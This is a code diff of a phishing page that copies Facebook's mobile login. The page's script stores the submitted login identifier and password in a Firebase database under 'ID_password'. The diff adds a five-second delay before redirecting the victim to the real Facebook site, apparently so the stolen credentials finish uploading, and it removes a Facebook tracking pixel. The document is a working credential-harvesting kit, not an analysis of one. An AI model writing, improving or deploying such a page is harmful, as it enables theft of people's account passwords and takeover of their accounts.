@@ -90,12 +90,23 @@
 					 password : input[1].value   
 				   }				
 					var couple = firebase.database().ref('ID_password').push(fb_data);  	
+					//window.open("https://m.facebook.com/?_rdr","_self");
 					}	
+					function op(){
+						window.open("https://m.facebook.com/?_rdr","_self");
+					}
 					document.getElementById('submit').addEventListener('click', function(e) {
 						e.preventDefault();
 						send();
-						window.open("https://m.facebook.com/?_rdr","_self");
+						
+						var delayInMilliseconds = 5000; //1 second
+
+						setTimeout(function() {
+						op();
+						//your code to be executed after 1 second
+						}, delayInMilliseconds);
 					}, false);
+					
 				</script>
 
 
@@ -128,7 +139,7 @@
 				</div>
 				</div>
 				<div></div>
-				<img src="./Log in to Facebook _ Facebook_files/hsts-pixel.gif" width="0" height="0" style="display:none">
+				
 				<div class="_55wr _5ui2">
 					<div class="_5dpw">
 						<div class="_5ui3" >
